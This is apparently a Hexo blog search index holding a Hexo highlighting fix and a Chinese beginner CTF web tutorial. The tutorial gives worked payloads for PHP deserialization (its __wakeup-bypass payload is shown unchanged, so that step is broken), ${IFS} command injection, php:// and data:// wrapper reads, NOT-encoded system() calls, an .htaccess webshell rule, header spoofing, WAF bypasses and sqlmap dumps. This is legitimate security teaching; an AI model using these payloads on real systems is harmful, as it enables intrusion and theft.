<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>hexo部分问题解决</title>
    <url>/2024/06/21/hexo%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<h2 id="1-处理hexo的代码高亮问题"><a href="#1-处理hexo的代码高亮问题" class="headerlink" title="1. 处理hexo的代码高亮问题"></a>1. 处理hexo的代码高亮问题</h2><p>在处理kaze主题的时候，因为需要找到一个合适的代码高亮的主题，所以我就在kaze的代码高亮中修改配置文件，同时又修改了hexo的配置文件，但我发现了一个问题，那就是代码高亮的颜色不太对，而且不能及时的修改，不管用<code>hexo g</code>生成几次都是原来的样子。</p>
<p>经过一番搜索，终于找到了解决办法，下面是解决方法：</p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ol>
<li><p>找到hexo的配置文件<code>_config.yml</code>，找到<code>highlight</code>部分，修改<code>hljs</code>为<code>true</code>，把<code>wrap</code>改为<code>true</code>这样就能把我们的代码圈起来,注意的是<code>highlight</code>的显示代码行数在<code>kaze</code>主题中是不能使用的。</p>
</li>
<li><p>用<code>hexo clean</code>命令清除缓存，然后用<code>hexo g</code>命令重新生成静态文件。<strong>这一步非常的重要，如果不去清楚缓存，就不会生效。</strong></p>
</li>
<li><p>重新打开博客，代码高亮应该就正常了。</p>
</li>
</ol>
<hr>
<p>以上就是解决hexo代码高亮问题的方法，希望能帮到大家。</p>
<hr>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFweb的简单入门</title>
    <url>/2024/09/09/CTFwebd%E7%9A%84%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="CTFWEB"><a href="#CTFWEB" class="headerlink" title="CTFWEB"></a>CTFWEB</h1><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>想要在这个php代码中拿到相应的<strong>flag</strong>,我们需要关注到这个函数<code>unserialize($p)</code>,他用于反序列化</p>
</blockquote>
<p>通过分析代码，我们可知，只有当<code>admin</code>和<code>passwd</code>都等于<code>admin</code>和<code>ctf</code>时，才会执行<code>include(&quot;flag.php&quot;);</code>语句，并输出<code>flag</code>内容。</p>
<p>所以，我们只需要构造一个序列化的字符串，其中<code>admin</code>和<code>passwd</code>都等于<code>admin</code>和<code>ctf</code>，即可得到<code>flag</code>内容。</p>
<p>对于序列化的教程，就是在这里：</p>
<p><a class="link"   href="https://hello-ctf.com/HC_Web/php_unser_base/" >https://hello-ctf.com/HC_Web/php_unser_base/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们这里直接放上序列化后的代码</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;wllm&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ctf&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在这里，<strong>提供的序列化字符串 O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;} 表示一个 wllm 类的实例，其中 admin 属性被设置为 “admin”，passwd 属性被设置为 “ctf”。</strong></p>
</blockquote>
<p>注意，有时php代码中会有<code>_wakeup()</code>,同时使用其他不可逆的加密算法。</p>
<p>例如：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;wllm&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No wake up&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Letmeseesee</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$Letmeseesee</span>);</span><br></pre></td></tr></table></figure></div>

<p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 <code>__weakup()</code>,因而先构造</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">p=O:<span class="number">6</span>:<span class="string">&quot;HaHaHa&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;wllm&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>我们再修改，他的参数列表中的成员个数</p>
</blockquote>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">p=O:<span class="number">6</span>:<span class="string">&quot;HaHaHa&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;wllm&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样就可以绕过<code>__weakup()</code>函数，直接执行<code>include(&quot;flag.php&quot;);</code>语句，输出<code>flag</code>内容。</p>
<hr>
<h2 id="cookie信息检查"><a href="#cookie信息检查" class="headerlink" title="cookie信息检查"></a>cookie信息检查</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;../next.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;小饼干最好吃啦！&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> 小饼干最好吃啦！</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这里进行检查的cookie值是：<code>admin=1</code>，而不是<code>1</code>，通过使用<strong>hackbar</strong>工具，我们可以修改cookie值，修改为<code>admin=1</code>即可通过检查，拿到下一个php页面</p>
</blockquote>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>在这里可以使用<strong>get</strong>请求进行linux的命令执行，但是php进行了限制，php通过<code>preg_match</code>函数进行了<strong>空格</strong>的过滤,所以我们要想办法绕过空格的检查</p>
<blockquote>
<p>${IFS} 是 Bash 脚本中用于表示内部字段分隔符（Internal Field Separator）的环境变量。在 Bash 中，IFS 默认为空格、制表符和换行符。</p>
</blockquote>
<p>我们可以尝试使用<code>$&#123;IFS&#125;</code>进行命令执行,命令为：</p>
<p>(websit)?url&#x3D;ls${IFS}&#x2F;</p>
<p>这样我们就可以执行linux的<code>ls</code>命令,得到当前目录下的文件列表,寻找flag的文件。</p>
<h2 id="php数据流"><a href="#php数据流" class="headerlink" title="php数据流"></a>php数据流</h2><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">url: http://node7.anna.nssctf.cn:29530/index.php?wllm=</span><br><span class="line">content: hint is hear Can you find out the hint.php?</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>题目中给出了提示，提示说要找到<code>hint.php</code>文件，我们可以使用<code>php</code>的伪协议进行访问，伪协议是一种特殊的协议，它允许我们访问本地文件，而不用访问服务器。</p>
</blockquote>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>php:&#x2F;&#x2F;filter 是PHP中一个非常强大的伪协议，它允许你在读取或写入数据时应用各种过滤器。这些过滤器可以对数据进行转换、编码、解码等操作。</p>
<ol>
<li><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hint.php 伪协议中，它实际上是一个由多个部分组成的复合伪协议：</p>
</li>
<li><p>php:&#x2F;&#x2F;filter：这是PHP伪协议的根部分，它表明接下来的操作将通过一个或多个过滤器链来处理数据。</p>
</li>
<li><p>read&#x3D;convert.base64-encode：这是一个过滤器，指定在读取数据时应用 convert.base64-encode 过滤&gt;器。这个过滤器会将读取的数据转换成Base64编码。</p>
</li>
<li><p>resource&#x3D;hint.php：这指定了实际的资源文件，即 hint.php。在这个例子中，php:&#x2F;&#x2F;filter 伪协议会尝试读取 hint.php 文件的内容，并通过前面指定的过滤器链进行处理。</p>
</li>
</ol>
</blockquote>
<h3 id="php-filter-的基本语法如下："><a href="#php-filter-的基本语法如下：" class="headerlink" title="php:&#x2F;&#x2F;filter 的基本语法如下："></a>php:&#x2F;&#x2F;filter 的基本语法如下：</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/&lt;filtername&gt;[=&lt;filteroptions&gt;]/&lt;resource&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><filtername>：过滤器的名称，如 convert.base64-encode、zlib.deflate 等。</li>
<li><filteroptions>：过滤器的选项，可选，用于指定过滤器的特定参数。</li>
<li><resource>：要读取或写入的资源，如文件名、URL等。</li>
</ul>
</blockquote>
<p>所以我们组合起来进行读取<code>hint.php</code>文件.</p>
<p>url: <a class="link"   href="http://node7.anna.nssctf.cn:29530/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php" >http://node7.anna.nssctf.cn:29530/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这样我们会拿到一个<code>base64</code>的密码: <code>PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</code></p>
<p>解码后为: </p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>所以这样我们就知道我们这个题下一个要去的网站是<code>http://node7.anna.nssctf.cn:29530/test2222222222222.php</code></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>通过分析php的代码，我们可以知道，这个题目中，通过传入<code>a</code>参数，来进行获取<code>flag</code>。</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($a) &amp;&amp; (file_get_contents($a, &#x27;r&#x27;)) === &#x27;I want flag&#x27;)</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>检查变量 $a 是否设置，并且使用 file_get_contents() 函数尝试从 $a 指定的数据流中读取内容。如果读取的内容恰好是 ‘I want flag’，则输出 “success” 和 $flag 的值。</p>
<p>所以，我们只需要构造一个文件，内容为<code>I want flag</code>，然后将这个文件的路径传入<code>a</code>参数，即可得到flag。</p>
</blockquote>
<p>所以我们构造为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node7.anna.nssctf.cn:29530/test2222222222222.php?a=data://text/plain,I%20want%20flag</span><br></pre></td></tr></table></figure></div>

<p>这样我们就能拿到<code>flag</code>了。</p>
<h2 id="php正则表达式url编码取反绕过"><a href="#php正则表达式url编码取反绕过" class="headerlink" title="php正则表达式url编码取反绕过"></a>php正则表达式url编码取反绕过</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>题目中给出了提示，提示说不能用空格、制表符、回车、换行符、加号、中括号、 circumflex、反斜杠、双引号、减号、美元符、星号、问号、小于号、大于号、等于号、反引号，不能用字母。</p>
<p>我们只要绕过了正则表达式，就可以使用<code>eval()</code>函数执行任意代码。</p>
</blockquote>
<p>我们,想要绕过正则表达式，可以进行<strong>url编码取反</strong>，然后<strong>传参时再取反</strong>，这样就可以绕过正则表达式的限制。</p>
<p>我们使用php的<code>urlencode()</code>函数进行url编码，然后使用<code>~</code>进行取反。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;ls /&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>输出结果：</p>
<p>%8C%86%8C%8B%9A%92</p>
<p>%93%8C%DF%D0</p>
</blockquote>
<p>我们可以看到，<code>system</code>被编码为<code>%8C%86%8C%8B%9A%92</code>，<code>ls /</code>被编码为<code>%93%8C%DF%D0</code>。**(这些我们都进行了url编码然后取反，我们传参的时候一定要再取反，这样才能把我们的代码正确传入。)**</p>
<p>就是负负得正嘛。</p>
<p>我们再拼接好url(别忘了分号)</p>
<p>url: <a class="link"   href="http://node7.anna.nssctf.cn:26769/?wllm=**(~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)****(~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)" >http://node7.anna.nssctf.cn:26769/?wllm=**(~%8C%86%8C%8B%9A%92)****(~%93%8C%DF%D0) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>**;</p>
<p>这样我们就绕过了正则表达式的限制，执行任意代码，拿到了目录。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span> NoVic4说：不错哦小伙子，可你能拿到flag吗？bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure></div>

<p>我们可以看到<code>flllllaaaaaaggggggg</code>这个文件，这个就是<code>flag</code>存储的地方。</p>
<p>我们再次使用<code>urlencode()</code>函数进行url编码，然后使用<code>~</code>进行取反。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;/tac /flllllaaaaaaggggggg&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>输出结果：</p>
<p>%8C%86%8C%8B%9A%92</p>
<p>%D0%8B%9E%9C%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98</p>
</blockquote>
<p>我们再次拼接好url，就可以拿到<code>flag</code>了。</p>
<h2 id="php文件上传-htaccess绕过"><a href="#php文件上传-htaccess绕过" class="headerlink" title="php文件上传.htaccess绕过"></a>php文件上传.htaccess绕过</h2><p>.htaccess文件是Apache服务器的配置文件，它可以对请求进行过滤、重定向、认证等操作。</p>
<p><code>.htaccess</code>文件内容</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;webshell.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在 .htaccess 文件中使用 &lt;FilesMatch “webshell.jpg”&gt; 这样的指令，可以将所有匹配特定模式的文件（在这个例子中是 webshell.jpg）指定给特定的处理器处理。这里的 SetHandler application&#x2F;x-httpd-php 指令意味着将这些匹配的文件作为 PHP 脚本处理。</p>
</blockquote>
<ul>
<li>当有文件名匹配 webshell.jpg 的文件被请求时，Apache 服务器会被指示将该文件作为 PHP 脚本执行，而不是作为图像文件发送给客户端。</li>
<li>这可以用于绕过一些简单的文件上传限制，例如，如果一个网站只允许上传图像文件，但不允许上传 PHP 文件，攻击者可能会尝试上传一个包含 PHP 代码的 .jpg 文件，并使用这样的 .htaccess 规则来使得服务器执行该文件作为 PHP 脚本。</li>
</ul>
<h2 id="php本地访问"><a href="#php本地访问" class="headerlink" title="php本地访问"></a>php本地访问</h2><ul>
<li>使用<code>X-Forwarded-For</code>,<code>client-ip</code>等来实现php本地访问</li>
<li>使用<code>via</code>来设置代理</li>
</ul>
<h2 id="php-WAF绕过"><a href="#php-WAF绕过" class="headerlink" title="php WAF绕过"></a>php WAF绕过</h2><ol>
<li><code>脏数据</code>:即传入一段长数据使waf失效，从而实现绕过waf。某些waf处理POST的数据时，只会检测开头的8K，后面选择全部放过。</li>
<li><code>高并发</code>: 由于waf的存在，导致服务器的并发量过高，导致响应时间变长，从而导致waf误判，从而通过waf。</li>
<li><code>Http参数绕过</code>:在 php 语言中 id&#x3D;1&amp;id&#x3D;2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一 些 waf 的拦截。</li>
<li></li>
</ol>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQLmap使用"><a href="#SQLmap使用" class="headerlink" title="SQLmap使用"></a>SQLmap使用</h3><p><strong>SQLMAP</strong>常规渗透思路</p>
<ol>
<li>列数据库信息：<code>sqlmap -u http://www.example.com --dbs</code></li>
<li>web当前使用的数据库：<code>sqlmap -u http://www.example.com --current-db</code></li>
<li>web数据库当前使用的账户：<code>sqlmap -u http://www.example.com --current-user</code></li>
<li>列出数据库所有的用户；<code>sqlmap -u http://www.example.com --users</code></li>
<li>数据库账号与密码：<code>sqlmap -u http://www.example.com --passwords</code></li>
<li>列出数据库表：<code>sqlmap -u http://www.example.com --tables</code></li>
<li>指定库名列出所有的表：<code>sqlmap -u http://www.example.com -D database_name --tables</code></li>
<li>指定库名表名列出所有字段：<code>sqlmap -u http://www.example.com -D database_name -T table_name --columns</code></li>
<li>指定库名表名字段dump出指定字段：<code>sqlmap -u http://www.example.com -D database_name -T table_name -C column_name --dump</code></li>
</ol>
<blockquote>
<p>我们先使用<code>sqlmap</code>查看当前网页所使用的数据库。</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:29530/index.php --current-db</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>输出结果：</p>
<p>current database: <code>test_db</code></p>
</blockquote>
<p>在拿到当前数据库名称后，使用<code>-D test_db --dump</code>来获取当前数据库中的内容。</p>
